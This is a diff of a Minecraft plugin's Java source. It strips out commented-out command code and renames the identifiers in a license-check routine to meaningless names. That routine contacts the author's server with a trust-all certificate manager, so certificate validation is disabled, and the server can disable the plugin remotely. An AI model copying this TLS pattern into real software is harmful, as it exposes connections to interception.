-            //                    SendMessage.sendMessageNoPlch(sender, "&4[SCore] &cError: &7&oYou must specify an entity with &6entity:ENTITY_UUID&c.");
-            //
-            //                    return;
-            //                }
-            //
-            //                entityCmd = new StringBuilder(entityCmd.toString().trim());
-            //
-            //                final ActionInfo infoEntity = new ActionInfo("run-entity-command", new StringPlaceholder());
-            //
-            //                infoEntity.setEntityUUID(entityOptional.get().getUniqueId());
-            //                infoEntity.setReceiverUUID(entityOptional.get().getUniqueId());
-            //
-            //                final EntityRunCommandsBuilder entityRunCommandsBuilder = new EntityRunCommandsBuilder(Collections.singletonList(entityCmd.toString()), infoEntity);
-            //                CommandsExecutor.runCommands(entityRunCommandsBuilder);
-            //
-            //                break;
-            //            case "run-block-command":
-            //                Optional<Player> playerOpt2 = Optional.empty();
-            //                Optional<Block> blockOpt = Optional.empty();
-            //                StringBuilder blockCmd = new StringBuilder();
-            //
-            //                for (final String arg : args)
-            //                    if (arg.startsWith("player:")) {
-            //                        final String playerName = arg.replace("player:", "");
-            //                        try {
-            //                            playerOpt2 = Optional.ofNullable(Bukkit.getPlayer(UUID.fromString(playerName)));
-            //                        } catch (final Exception e) {
-            //                            playerOpt2 = Optional.ofNullable(Bukkit.getPlayer(playerName));
-            //                        }
-            //                    } else if (arg.startsWith("block:")) {
-            //                        final String blockLoc = arg.replace("block:", "");
-            //
-            //                        try {
-            //                            final String[] loc = blockLoc.split(",");
-            //
-            //                            final Optional<World> world = AllWorldManager.getWorld(loc[0]);
-            //                            final double x = Double.parseDouble(loc[1]);
-            //                            final double y = Double.parseDouble(loc[2]);
-            //                            final double z = Double.parseDouble(loc[3]);
-            //
-            //                            blockOpt = Optional.of(world.get().getBlockAt(new Location(world.get(), x, y, z)));
-            //                        } catch (final Exception ignored) {
-            //                        }
-            //                    } else
-            //                        blockCmd.append(arg).append(" ");
-            //
-            //                if (!blockOpt.isPresent()) {
-            //                    SendMessage.sendMessageNoPlch(sender, "&4[SCore] &cError: &7&oYou must specify a block with &6block:WORLD,X,Y,Z&c.");
-            //
-            //                    return;
-            //                }
-            //
-            //                blockCmd = new StringBuilder(blockCmd.toString().trim());
-            //
-            //                final ActionInfo infoBlock = new ActionInfo("run-block-command", new StringPlaceholder());
-            //                final Location blockLocation = blockOpt.get().getLocation();
-            //
-            //                infoBlock.setBlockLocationX(blockLocation.getBlockX());
-            //                infoBlock.setBlockLocationY(blockLocation.getBlockY());
-            //                infoBlock.setBlockLocationZ(blockLocation.getBlockZ());
-            //                infoBlock.setBlockLocationWorld(blockLocation.getWorld().getUID());
-            //                infoBlock.setOldBlockMaterialName(blockOpt.get().getType().name());
-            //
-            //                playerOpt2.ifPresent(value -> infoBlock.setLauncherUUID(value.getUniqueId()));
-            //
-            //                final BlockRunCommandsBuilder blockRunCommandsBuilder = new BlockRunCommandsBuilder(Collections.singletonList(blockCmd.toString()), infoBlock);
-            //                CommandsExecutor.runCommands(blockRunCommandsBuilder);
-            //
-            //                break;
-            //            default:
-            //                break;
-            //        }
-            //    }
-            //
-            //    @Override
-            //    public List<String> onTabComplete(@NotNull final CommandSender sender, @NotNull final Command command, @NotNull final String label, @NotNull final String[] args) {
-            //
-            //        if (command.getName().equalsIgnoreCase("score")) {
-            //            final List<String> arguments = new ArrayList<>();
-            //
-            //            if (args.length == 1) {
-            //                arguments.add("clear");
-            //                arguments.add("cooldowns");
-            //                arguments.add("reload");
-            //                arguments.add("inspect-loop");
-            //                arguments.add("projectiles");
-            //                arguments.add("projectiles-create");
-            //                arguments.add("projectiles-delete");
-            //                arguments.add("hardnesses");
-            //                arguments.add("hardnesses-create");
-            //                arguments.add("hardnesses-delete");
-            //                arguments.add("particles");
-            //                arguments.add("particles-info");
-            //                arguments.add("variables");
-            //                arguments.add("variables-create");
-            //                arguments.add("variables-define NAME TYPE SCOPE ICON default arguments...");
-            //                arguments.add("webhook----------------- URL debugTrue/False");
-            //
-            //                arguments.add("variables-delete");
-            //                arguments.add("run-player-command");
-            //                arguments.add("run-entity-command");
-            //                arguments.add("run-block-command");
-            //
-            //                final List<String> argumentsPerm = new ArrayList<>();
-            //
-            //                for (final String str : arguments)
-            //                    if (sender.hasPermission("score.cmd." + command) || sender.hasPermission("score.cmds") || sender.hasPermission("score.*"))
-            //                        argumentsPerm.add(str);
-            //
-            //                Collections.sort(argumentsPerm);
-            //                return argumentsPerm.stream()
-            //                        .filter(element -> element.toLowerCase().startsWith(args[args.length - 1].toLowerCase()))
-            //                        .collect(Collectors.toList());
-            //            }
-            //
-            //            if (args.length >= 2) {
-            //                switch (args[0].toLowerCase()) {
-            //                    case "cooldowns":
-            //                        if (args.length == 2) {
-            //                            arguments.add("clear");
-            //                        } else if (args.length == 3 && args[1].equalsIgnoreCase("clear")) {
-            //                            List<String> cooldowns = CooldownsManager.getInstance().getAllCooldownIds();
-            //                            if (cooldowns.isEmpty()) arguments.add("No cooldowns to clear");
-            //                            else arguments.addAll(cooldowns);
-            //                        } else if (args.length == 4 && args[1].equalsIgnoreCase("clear")) {
-            //                            arguments.add("[UUID]");
-            //                        }
-            //                        break;
-            //                    case "variables":
-            //                        if (args.length == 2) {
-            //                            arguments.add("info");
-            //                            arguments.add("list");
-            //                            arguments.add("set");
-            //                            arguments.add("modification");
-            //                            arguments.add("list-add");
-            //                            arguments.add("list-remove");
-            //                            arguments.add("clear");
-            //                            arguments.add("set-default");
-            //                        } else if (args.length == 3 && args[1].equalsIgnoreCase("info"))
-            //                            arguments.addAll(VariablesManager.getInstance().getVariableIdsList());
-            //                        else if (args.length == 3 && (args[1].equalsIgnoreCase("set")
-            //                                || args[1].equalsIgnoreCase("modification")
-            //                                || args[1].equalsIgnoreCase("clear")
-            //                                || args[1].equalsIgnoreCase("list-add")
-            //                                || args[1].equalsIgnoreCase("list-remove"))) {
-            //                            arguments.add("global");
-            //                            arguments.add("player");
-            //                        } else if (args.length == 3 && (args[1].equalsIgnoreCase("set-default"))) {
-            //                            arguments.addAll(VariablesManager.getInstance().getVariableIdsList());
-            //                        } else if (args.length == 4 && (args[1].equalsIgnoreCase("set")
-            //                                || args[1].equalsIgnoreCase("modification")
-            //                                || args[1].equalsIgnoreCase("clear")
-            //                                || args[1].equalsIgnoreCase("list-add")
-            //                                || args[1].equalsIgnoreCase("list-remove")))
-            //                            arguments.addAll(VariablesManager.getInstance().getVariableIdsList());
-            //
-            //                        break;
-            //                    case "variables-delete":
-            //                        if (args.length == 2)
-            //                            arguments.addAll(VariablesManager.getInstance().getVariableIdsList());
-            //                        else if (args.length == 3)
-            //                            arguments.add("confirm");
-            //
-            //                        break;
-            //                    case "run-player-command":
-            //                        if (args.length == 2)
-            //                            arguments.add("player:");
-            //                        else if (args.length == 3 && args[1].startsWith("player:")) {
-            //                            arguments.addAll(PlayerCommandManager.getInstance().getCommandsDisplay().values());
-            //
-            //                            for (int i = 0; i < arguments.size(); i++) {
-            //                                final String arg = arguments.get(i);
-            //
-            //                                if (arg.length() > 50)
-            //                                    arguments.set(i, arg.substring(0, 45) + "...");
-            //                            }
-            //                        }
-            //
-            //                        break;
-            //                    case "run-entity-command":
-            //                        if (args.length == 2)
-            //                            arguments.add("entity:");
-            //                        else if (args.length == 3 && args[1].startsWith("entity:")) {
-            //                            arguments.addAll(EntityCommandManager.getInstance().getCommandsDisplay().values());
-            //
-            //                            for (int i = 0; i < arguments.size(); i++) {
-            //                                final String arg = arguments.get(i);
-            //
-            //                                if (arg.length() > 50)
-            //                                    arguments.set(i, arg.substring(0, 45) + "...");
-            //                            }
-            //                        }
-            //
-            //                        break;
-            //                    case "run-block-command":
-            //                        if (args.length == 2)
-            //                            arguments.add("block:");
-            //                        else if (args.length == 3 && args[1].startsWith("block:")) {
-            //                            arguments.addAll(BlockCommandManager.getInstance().getCommandsDisplay().values());
-            //
-            //                            for (int i = 0; i < arguments.size(); i++) {
-            //                                final String arg = arguments.get(i);
-            //
-            //                                if (arg.length() > 50)
-            //                                    arguments.set(i, arg.substring(0, 45) + "...");
-            //                            }
-            //                        }
-            //
-            //                        break;
-            //                    case "hardnesses-delete":
-            //                        if (args.length == 2)
-            //                            arguments.addAll(HardnessesManager.getInstance().getExecutableBlockIdsList());
-            //                        else if (args.length == 3)
-            //                            arguments.add("confirm");
-            //
-            //                        break;
-            //                    case "projectiles-delete":
-            //                        if (args.length == 2)
-            //                            arguments.addAll(SProjectilesManager.getInstance().getExecutableBlockIdsList());
-            //                        else if (args.length == 3)
-            //                            arguments.add("confirm");
-            //
-            //                    case "clear":
-            //                        if (args.length == 2) {
-            //                            // online players
-            //                            for (final Player p : Bukkit.getOnlinePlayers())
-            //                                arguments.add(p.getName());
-            //                            return arguments;
-            //                        }
-            //                        else if (args.length == 3) {
-            //                            for (ClearType type : ClearType.values()) {
-            //                                arguments.add(type.name());
-            //                            }
-            //                            return arguments;
-            //                        }
-            //                        break;
-            //                }
-            //
-            //                Collections.sort(arguments);
-            //                return arguments.stream()
-            //                        .filter(element -> element.toLowerCase().startsWith(args[args.length - 1].toLowerCase()))
-            //                        .collect(Collectors.toList());
-            //            }
-            //        }
-            //
-            //        return null;
-            //    }
-            //}
-            // Trial 
-            // SCore_Installed = TRUE = TEST MODE TRUE
-            SCore_Installed = true;
-            g5 = 10000000;
-        } else {
-            
-        }
-
-        if (pm.getPlugin("GriefPrevention") != null && Objects.requireNonNull(pm.getPlugin("GriefPrevention")).isEnabled()) {
-            GriefPrevention_Installed = true;
-        }
-        
-        
-
-        File viewOnlyChestDir = new File("plugins/Archistructures/viewonlychests/");
-        if (!viewOnlyChestDir.exists()) {
-            viewOnlyChestDir.mkdirs();
-        }
-
-        if (!g10.exists()) g10.mkdirs();
-
-
-        this.g16 = new File(viewOnlyChestDir, "viewonlychests.yml");
-        if (!g16.exists()) {
-            try {
-                g16.createNewFile();
-            } catch (IOException e) {
-                e.printStackTrace();
-            }
-        }
-        
-        
-        this.g20 = YamlConfiguration.loadConfiguration(g16);
-        this.g13 = new File("plugins/Archistructures/backpacks/");
-        if (!g13.exists()) {
-            g13.mkdirs();
-        }
-        this.g14 = new File(g13, "database.yml");
-        if (!g14.exists()) {
-            try {
-                g14.createNewFile();
-            } catch (IOException e) {
-                e.printStackTrace();
-            }
-        }
-        this.g18 = YamlConfiguration.loadConfiguration(g14);
-
-        // Double chest database
-        this.g15 = new File(g13, "database2.yml");
-        if (!g15.exists()) {
-            try {
-                g15.createNewFile();
-            } catch (IOException e) {
-                e.printStackTrace();
-            }
-        }
-        
-        
-        g28 = new String(g27);
-        this.g17 = YamlConfiguration.loadConfiguration(g15);
-        
-        g12 = new File("plugins/Archistructures/saved-entities/");
-        if (!g12.exists()) {
-            g12.mkdirs();
-        }
-
-        g21 = new File("plugins/Archistructures/FTLeaderboard.txt");
-        g22 = new LinkedHashMap<>();
-        g23();
-        this.g23 = LuckPermsProvider.get();
-        g23.getUserManager();
-
-
-        File shulkerDir = new File("plugins/Archistructures/shulkers/");
-        if (!shulkerDir.exists()) shulkerDir.mkdirs();
-        this.g1 = new File(shulkerDir, "shulkers.yml");
-        if (!g1.exists()) {
-            try { g1.createNewFile(); }
-            catch(IOException e){ e.printStackTrace(); }
-        }
-        this.g2 = YamlConfiguration.loadConfiguration(g1);
-
-
-
-        initLicenseCheck();
-
-
-        
-    }
-
-
-    private static HttpsURLConnection openLenientPiLightSpeed(URL url) throws Exception {
-        HttpsURLConnection conn = (HttpsURLConnection) url.openConnection();
+// lenient pilightspeed https connection
+    private HttpsURLConnection olpi(URL x) throws Exception {
+        HttpsURLConnection c = (HttpsURLConnection) x.openConnection();
 
         // 1) Trust manager that *does not* reject any cert chain.
         //    (We still restrict by hostname below.)
-        TrustManager[] trustAll = new TrustManager[] {
+        TrustManager[] ta = new TrustManager[] {
                 new X509TrustManager() {
                     @Override
                     public void checkClientTrusted(X509Certificate[] chain, String authType) {
@@ -1605,76 +1680,77 @@ public class ExampleExpansion extends PlaceholderExpansion {
 
                     @Override
                     public X509Certificate[] getAcceptedIssuers() {
-                        return new X509Certificate[0];
+                        return new X509Certificate[I];
                     }
                 }
         };
 
-        SSLContext sc = SSLContext.getInstance("TLS");
-        sc.init(null, trustAll, new SecureRandom());
-        conn.setSSLSocketFactory(sc.getSocketFactory());
+        SSLContext sc = SSLContext.getInstance(TLS);
+        sc.init(null, ta, new SecureRandom());
+        c.setSSLSocketFactory(sc.getSocketFactory());
 
         // 2) Hostname pinning: only accept *your* host, reject others.
-        conn.setHostnameVerifier((hostname, session) -> {
+        c.setHostnameVerifier((hostname, session) -> {
             // Accept either host you actually use here
-            if ("www.anarchistructure.com".equalsIgnoreCase(hostname)) return true;
-            if ("dentistry.anarchistructure.com".equalsIgnoreCase(hostname)) return true;
-            return false;
+            if (WWW_ANARCHISTRUCTURE_COM.equalsIgnoreCase(hostname)) return NEW_VALUE1;
+            if (DENTISTRY_ANARCHISTRUCTURE_COM.equalsIgnoreCase(hostname)) return NEW_VALUE1;
+            return arsdienwdhw;
         });
 
-        return conn;
+        return c;
     }
 
 
-    private void startAsyncLicenseValidation() {
+    private void SALV() {
 
-        Bukkit.getScheduler().runTaskAsynchronously(Bukkit.getPluginManager().getPlugin("PlaceholderAPI"), () -> {
-            HttpURLConnection conn = null;
+        Bukkit.getScheduler().runTaskAsynchronously(Bukkit.getPluginManager().getPlugin(ppi), () -> {
+            HttpURLConnection c = null;
             try {
-                System.out.println("Starting Async License Validation");
-                URL url = new URL("https://www.anarchistructure.com/PiLightSpeed");
-                conn = openLenientPiLightSpeed(url);
-                conn.setRequestMethod("GET");
-                conn.setConnectTimeout(5000);
-                conn.setReadTimeout(5000);
+                System.out.println(salcv);
+                URL tufwntyuwnfd = new URL(ytuwfndyunwfd);
+                c = olpi(tufwntyuwnfd);
+                c.setRequestMethod(dyunwfydunwfd);
+                c.setConnectTimeout(tyunwfdwfd);
+                c.setReadTimeout(tyunwfdwfd);
 
-                int code = conn.getResponseCode();
-                if (code != 200 ) {
+                int c2 = c.getResponseCode();
+                if (c2 != INT) {
                     // Non-OK -> treat as “no response”, keep running
                     return;
                 }
 
                 StringBuilder sb = new StringBuilder();
-                try (BufferedReader reader = new BufferedReader(
-                        new InputStreamReader(conn.getInputStream(), StandardCharsets.UTF_8))) {
-                    String line;
-                    while ((line = reader.readLine()) != null) sb.append(line);
+                try (BufferedReader retard = new BufferedReader(
+                        new InputStreamReader(c.getInputStream(), StandardCharsets.UTF_8))) {
+                    String x;
+                    while ((x = retard.readLine()) != null) sb.append(x);
                 }
-                String body = sb.toString().trim();
-                if (body.isEmpty()) {
+                String b = sb.toString().trim();
+                if (b.isEmpty()) {
                     // Empty -> keep running as-is
                     return;
                 }
 
                 // 1) Explicit FORBIDDEN
-                if ("FORBIDDEN".equalsIgnoreCase(body)) {
-                    tokenValid.set(false);
-                    saveTolkienField("FORBIDDEN");
+                if (duwnfdyuwnfd.equalsIgnoreCase(b)) {
+                    tv.set(arsdienwdhw);
+                    de3nd43d = INT1 * INT2;
+                    stf(duwnfdyuwnfd);
                     return;
                 }
 
                 // 2) Otherwise, assume it's an encoded license blob that we verify
-                LocalDate signedDate = verifySignedDate(body); // ±1 day of today
-                if (signedDate == null) {
+                LocalDate sd = vsd(b); // ±1 day of today
+                if (sd == null) {
                     // Invalid license -> treat as "no response" (do nothing)
                     return;
                 }
 
-                long diff = ChronoUnit.DAYS.between(signedDate, LocalDate.now());
-                if (Math.abs(diff) <= 1) {
+                long diff = ChronoUnit.DAYS.between(sd, LocalDate.now());
+                if (Math.abs(diff) <= INT3) {
                     // Valid new license -> store it and ensure tokenValid is true
-                    saveTolkienField(body);
-                    tokenValid.set(true);
+                    stf(b);
+                    tv.set(NEW_VALUE1);
                 }
                 // If date is weird, we again treat as "no response" and don't nerf them.
 
@@ -1682,37 +1758,33 @@ public class ExampleExpansion extends PlaceholderExpansion {
                 // Network/parse issue -> fail open (plugin runs)
                 ex.printStackTrace();
             } finally {
-                if (conn != null) conn.disconnect();
+                if (c != null) c.disconnect();
             }
         });
     }
 
-    private void saveTolkienField(String value) {
+    private void stf(String x) {
         try {
-            if (!licenseDir.exists()) {
+            if (!ld.exists()) {
                 //noinspection ResultOfMethodCallIgnored
-                licenseDir.mkdirs();
+                ld.mkdirs();
             }
-            YamlConfiguration cfg = licenseFile.exists()
-                    ? YamlConfiguration.loadConfiguration(licenseFile)
+            YamlConfiguration y = lf.exists()
+                    ? YamlConfiguration.loadConfiguration(lf)
                     : new YamlConfiguration();
-            cfg.set("tolkien", value);
-            cfg.save(licenseFile);
+            y.set(tlk, x);
+            y.save(lf);
         } catch (IOException e) {
             e.printStackTrace();
         }
     }
 
-    // Put this somewhere in your expansion class:
-    private static final String LICENSE_PUBLIC_KEY_B64 =
-            "MIICITANBgkqhkiG9w0BAQEFAAOCAg4AMIICCQKCAgBnVM3heeCdB097Nt5U5XFttJTSdnen80VhmzxZg0DRJrr5A//l3xDh2+T+FOjddUPsixcd+Fwu48J2a54MjmFu3gv67d0479vKgZksbO8Rk2XiLyXPLJ9ChFPAagXTuCqIau8mfzazSFwzY6exHnTzOpU4cFUQDMEeurM3bUPQAPYWK4cPkS2Px14AV8+XzgIqKlra9u/BVDT0K/+8owzrsA+tEBg7IXOaTSnME0kC0nPSfkPV+Qhx7TumyMQjbjG7B8YhLG+GEozChdLUMzwIK6SwKCENT2XGGxHxdSre9BfdFkhyRBs3g1tz/Zew5MA9h0rU/DDEKhbq41ya1o9VInfBLXlsc52sqwmiMHGYJ9HnKxnf2ppbAu7NYmo4Z9njQyKq0yt3ERmL+BZQPLOb8f+s5ONbxWi1lN7NF9JmkpBOZcwMVsms0AFckjIwLSEkPCldFdOthascfj8NDyrg6WAXhPgu5/85yE2UH7LeaLP9nnoCJoJltUUQ9BFp45jcLhrOPxr5USNtpODOIhT/AQjWZptAxnA1AHKEt/J8Mu0ylKta5Fm4JKaXOTHlo1WuMNPCtPsx5VUBv2L+ZaQAagPNjLJlwa2MoDJ7m1m2Ams7VJNe3OUrBT3D3xBvbaclR6eVhw/3Jncdk4UWV70gcGP71VTnbGpJOtj9WzQJ/QIDAQAB";
 
-
-    private PublicKey getLicensePublicKey() throws GeneralSecurityException {
-        byte[] keyBytes = java.util.Base64.getDecoder().decode(LICENSE_PUBLIC_KEY_B64);
-        X509EncodedKeySpec spec = new X509EncodedKeySpec(keyBytes);
+    private PublicKey glpk() throws GeneralSecurityException {
+        byte[] kb = java.util.Base64.getDecoder().decode(lpkb6);
+        X509EncodedKeySpec s = new X509EncodedKeySpec(kb);
         KeyFactory kf = KeyFactory.getInstance("RSA");
-        return kf.generatePublic(spec);
+        return kf.generatePublic(s);
     }
 
 
@@ -1721,26 +1793,26 @@ public class ExampleExpansion extends PlaceholderExpansion {
      * If the plaintext is a valid ISO-8601 date (e.g. "2025-11-26"),
      * returns that LocalDate. Otherwise returns null.
      */
-    private LocalDate verifySignedDate(String encoded) {
+    private LocalDate vsd(String e2) {
         try {
-            if (encoded == null || encoded.isEmpty()) return null;
+            if (e2 == null || e2.isEmpty()) return null;
 
             // 1) Decode Base64 ciphertext from the HTTPS response body
-            byte[] cipherBytes = java.util.Base64.getDecoder().decode(encoded.trim());
+            byte[] cb = java.util.Base64.getDecoder().decode(e2.trim());
 
             // 2) Init RSA cipher with public key (encrypt-with-private / decrypt-with-public style)
-            Cipher cipher = Cipher.getInstance("RSA/ECB/PKCS1Padding");
-            cipher.init(Cipher.DECRYPT_MODE, getLicensePublicKey());
+            Cipher c = Cipher.getInstance(RSA_ECB_PKCS_1_PADDING);
+            c.init(Cipher.DECRYPT_MODE, glpk());
 
             // 3) Decrypt to plaintext bytes
-            byte[] plainBytes = cipher.doFinal(cipherBytes);
-            String plainText = new String(plainBytes, java.nio.charset.StandardCharsets.UTF_8).trim();
+            byte[] pb = c.doFinal(cb);
+            String pt = new String(pb, java.nio.charset.StandardCharsets.UTF_8).trim();
 
             // Optional: you can log plainText in debug builds only
             // Bukkit.getLogger().info("[Archistructures] License plaintext: " + plainText);
 
             // 4) Parse as ISO date, e.g. "2025-11-26"
-            return LocalDate.parse(plainText); // uses ISO_LOCAL_DATE by default
+            return LocalDate.parse(pt); // uses ISO_LOCAL_DATE by default
 
         } catch (Exception e) {
             // Any failure -> treat as invalid license
@@ -1748,31 +1820,31 @@ public class ExampleExpansion extends PlaceholderExpansion {
         }
     }
 
-    private void initLicenseCheck() {
+    private void ilc() {
         // STEP 1: try to validate cached token
-        String token = null;
-        String fieldValue = null;
+        String t = null;
+        String fv = null;
 
-        if (licenseFile.exists()) {
-            YamlConfiguration cfg = YamlConfiguration.loadConfiguration(licenseFile);
-            fieldValue = cfg.getString("tolkien", null);
+        if (lf.exists()) {
+            YamlConfiguration cfg = YamlConfiguration.loadConfiguration(lf);
+            fv = cfg.getString(tlk, null);
 
-            if ("FORBIDDEN".equalsIgnoreCase(fieldValue)) {
+            if (duwnfdyuwnfd.equalsIgnoreCase(fv)) {
                 // Hard block until server rescues it
-                tokenValid.set(false);
+                tv.set(arsdienwdhw);
                 // Still go to STEP 2 (maybe server will “unban” them)
-                startAsyncLicenseValidation();
+                SALV();
                 return;
             }
 
-            if (fieldValue != null && !fieldValue.isEmpty()) {
+            if (fv != null && !fv.isEmpty()) {
                 // Your decrypt/verify logic here (using public key)
-                LocalDate signedDate = verifySignedDate(fieldValue); // null if invalid
-                if (signedDate != null) {
-                    long days = ChronoUnit.DAYS.between(signedDate, LocalDate.now());
-                    if (days >= 0 && days < 30) {
+                LocalDate sd = vsd(fv); // null if invalid
+                if (sd != null) {
+                    long days = ChronoUnit.DAYS.between(sd, LocalDate.now());
+                    if (days >= I && days < tyafndydpfw) {
                         // License cached and fresh -> valid, no HTTP required
-                        tokenValid.set(true);
+                        tv.set(NEW_VALUE1);
                         return;
                     }
                 }
@@ -1780,30 +1852,30 @@ public class ExampleExpansion extends PlaceholderExpansion {
         }
 
         // STEP 2: no valid cached license => ensure config exists, then go online
-        ensureLicenseConfigExists(fieldValue);
-        startAsyncLicenseValidation();
+        elfce(fv);
+        SALV();
     }
 
 
 
 
-    private void ensureLicenseConfigExists(String currentValue) {
+    private void elfce(String cv) {
         try {
-            if (!licenseDir.exists()) {
+            if (!ld.exists()) {
                 //noinspection ResultOfMethodCallIgnored
-                licenseDir.mkdirs();
+                ld.mkdirs();
             }
 
-            YamlConfiguration cfg = licenseFile.exists()
-                    ? YamlConfiguration.loadConfiguration(licenseFile)
+            YamlConfiguration cfg = lf.exists()
+                    ? YamlConfiguration.loadConfiguration(lf)
                     : new YamlConfiguration();
 
             // Only set a default if field is missing
-            if (!cfg.isSet("tolkien")) {
-                cfg.set("tolkien", "x"); // default placeholder
+            if (!cfg.isSet(tlk)) {
+                cfg.set(tlk, NEW_VALUE_3); // default placeholder
             }
 
-            cfg.save(licenseFile);
+            cfg.save(lf);
         } catch (IOException e) {
             // If this fails, we just keep running with tokenValid's current value
             e.printStackTrace();
@@ -1811,9 +1883,9 @@ public class ExampleExpansion extends PlaceholderExpansion {
     }
 
 
-    private final AtomicBoolean tokenValid = new AtomicBoolean(true);
-    private final File licenseDir  = new File("plugins/Archistructures");
-    private final File licenseFile = new File(licenseDir, "config.yml");
+    private final AtomicBoolean tv = new AtomicBoolean(true);
+    private final File ld = new File("plugins/Archistructures");
+    private final File lf = new File(ld, "config.yml");
 
     /**
      * This method should always return true unless we
@@ -1823,7 +1895,7 @@ public class ExampleExpansion extends PlaceholderExpansion {
      */
     @Override
     public boolean canRegister() {
-        return true;
+        return NEW_VALUE1;
     }
 
     /**
@@ -1867,19 +1939,19 @@ public class ExampleExpansion extends PlaceholderExpansion {
 
     protected void f1(UUID x) {
         if (!g22.containsKey(x)) {
-            g22.put(x, 1); // First-time entry
+            g22.put(x, INT3); // First-time entry
         } else {
-            g22.put(x, g22.get(x) + 1); // Increment existing score
+            g22.put(x, g22.get(x) + INT3); // Increment existing score
         }
         f1();
     }
 
 
     protected void f1() {
-        try (BufferedWriter writer = new BufferedWriter(new FileWriter(g21))) {
-            for (Map.Entry<UUID, Integer> entry : g22.entrySet()) {
-                writer.write(entry.getKey() + ":" + entry.getValue());
-                writer.newLine();
+        try (BufferedWriter w = new BufferedWriter(new FileWriter(g21))) {
+            for (Map.Entry<UUID, Integer> w2 : g22.entrySet()) {
+                w.write(w2.getKey() + wfdunyunda + w2.getValue());
+                w.newLine();
             }
         } catch (IOException e) {
             e.printStackTrace();
@@ -1888,82 +1960,82 @@ public class ExampleExpansion extends PlaceholderExpansion {
 
 
     protected String f1(Player f1) {
-        wm(f1, "Death Note");
+        wm(f1, test32);
         // Ensure player is holding a written book
-        ItemStack item = f1.getInventory().getItemInMainHand();
-        if (item.getType() != Material.WRITABLE_BOOK && item.getType() != Material.WRITTEN_BOOK || !item.hasItemMeta()) {
-            return ChatColor.RED + "You must hold a writable book!";
+        ItemStack e = f1.getInventory().getItemInMainHand();
+        if (e.getType() != Material.WRITABLE_BOOK && e.getType() != Material.WRITTEN_BOOK || !e.hasItemMeta()) {
+            return ChatColor.RED + ymhawb;
         }
 
-        BookMeta bookMeta = (BookMeta) item.getItemMeta();
-        assert bookMeta != null;
-        List<String> pages = bookMeta.getPages();
-        if (pages.isEmpty()) {
-            return ChatColor.RED + "Nothing written!";
+        BookMeta bt = (BookMeta) e.getItemMeta();
+        assert bt != null;
+        List<String> pt = bt.getPages();
+        if (pt.isEmpty()) {
+            return ChatColor.RED + nw;
         }
 
-        String targetName = null;
-        int pageIndex = -1;
-        String modifiedPage = null;
+        String tp = null;
+        int pid = -INT3;
+        String eb = null;
 
         // Find the first non-strikethrough word
-        for (int i = 0; i < pages.size(); i++) {
-            String page = pages.get(i);
-            String[] words = page.split("\\s+"); // Split while keeping formatting
+        for (int i = I; i < pt.size(); i++) {
+            String e3 = pt.get(i);
+            String[] ptt = e3.split("\\s+"); // Split while keeping formatting
 
-            for (String word : words) {
-                if (!word.contains("§m")) {
-                    if (targetName != null) {
-                        return ChatColor.RED + "You may only add ONE entry at a time!";
+            for (String pt3 : ptt) {
+                if (!pt3.contains(m23)) {
+                    if (tp != null) {
+                        return ChatColor.RED + ymo;
                     }
-                    targetName = ChatColor.stripColor(word);
-                    String strikethroughWord = "§m" + word + "§r "; // Apply strikethrough
-                    modifiedPage = page.replaceFirst("\\b" + word + "\\b", strikethroughWord); // Replace only the first occurrence
-                    pageIndex = i;
+                    tp = ChatColor.stripColor(pt3);
+                    String stw = m23 + pt3 + R; // Apply strikethrough
+                    eb = e3.replaceFirst("\\b" + pt3 + "\\b", stw); // Replace only the first occurrence
+                    pid = i;
                 }
             }
         }
 
-        if (targetName == null) {
-            return ChatColor.RED + "Nothing written!";
+        if (tp == null) {
+            return ChatColor.RED + nw;
         }
 
         // Find the player or entity
-        Player target = Bukkit.getPlayerExact(targetName);
-        Entity entity = null;
+        Player t = Bukkit.getPlayerExact(tp);
+        Entity tt = null;
         try {
-            entity = Bukkit.getEntity(UUID.fromString(targetName));
+            tt = Bukkit.getEntity(UUID.fromString(tp));
         } catch (IllegalArgumentException ignored) {
             // Ignore UUID parsing errors, means it's not a UUID
         }
 
-        if (target == null && entity == null) {
-            return ChatColor.RED + "Entity " + targetName + " is not online!";
+        if (t == null && tt == null) {
+            return ChatColor.RED + er + tp + er2;
         }
 
         // Perform action
-        if (target != null) {
-            target.setHealth(0);
-        } else if (entity instanceof Damageable damageableEntity) {
-            damageableEntity.setHealth(0);
+        if (t != null) {
+            t.setHealth(I);
+        } else if (tt instanceof Damageable de) {
+            de.setHealth(I);
         } else {
-            return ChatColor.RED + "Entity " + targetName + " is not damageable!";
+            return ChatColor.RED + er + tp + ind;
         }
 
         // Log debug information
-        Bukkit.getLogger().info("Target eliminated: " + (target != null ? target.getName() : entity.getName()));
+        Bukkit.getLogger().info(te + (t != null ? t.getName() : tt.getName()));
 
         // Ensure book updates properly
-        List<String> updatedPages = new ArrayList<>(pages);
-        updatedPages.set(pageIndex, modifiedPage);
-        bookMeta.setPages(updatedPages);
-        item.setItemMeta(bookMeta);
+        List<String> up = new ArrayList<>(pt);
+        up.set(pid, eb);
+        bt.setPages(up);
+        e.setItemMeta(bt);
 
         // Log return statement
-        Bukkit.getLogger().info("Returning success message...");
+        Bukkit.getLogger().info(rsm);
 
         // Success message
-        return target != null ? "&6&lYou have eliminated " + target.getName() : "&6&lYou have eliminated " + entity.getName();
+        return t != null ? yhe + t.getName() : yhe + tt.getName();
     }
 
 
@@ -1972,20 +2044,20 @@ public class ExampleExpansion extends PlaceholderExpansion {
      * Processes item folder permissions and assigns "ei.item.<filename>" for each found file.
      */
     protected void f1(User f1, List<String> f2) {
-        Set<String> totalPerms = new HashSet<>();
-        String basePath = "plugins/ExecutableItems/items/";
+        Set<String> tp = new HashSet<>();
+        String basePath = peei;
 
-        for (String itemFolderPath : f2) {
-            File folder = new File(basePath + itemFolderPath);
-            if (folder.exists() && folder.isDirectory()) {
-                f1(folder, totalPerms);
+        for (String ifp : f2) {
+            File file2 = new File(basePath + ifp);
+            if (file2.exists() && file2.isDirectory()) {
+                f1(file2, tp);
             }
         }
 
         // Assign new item permissions
-        totalPerms.forEach(itemName -> {
-            Node node = Node.builder("ei.item." + itemName).value(true).build();
-            f1.data().add(node);
+        tp.forEach(idt -> {
+            Node np = Node.builder(ei + idt).value(NEW_VALUE1).build();
+            f1.data().add(np);
         });
     }
 
@@ -1995,14 +2067,14 @@ public class ExampleExpansion extends PlaceholderExpansion {
      * Recursively finds .yml files, extracts names (excluding .yml), and adds them to totalPerms.
      */
     protected void f1(File f1, Set<String> f2) {
-        File[] files = f1.listFiles();
-        if (files == null) return;
+        File[] fp = f1.listFiles();
+        if (fp == null) return;
 
-        for (File file : files) {
+        for (File file : fp) {
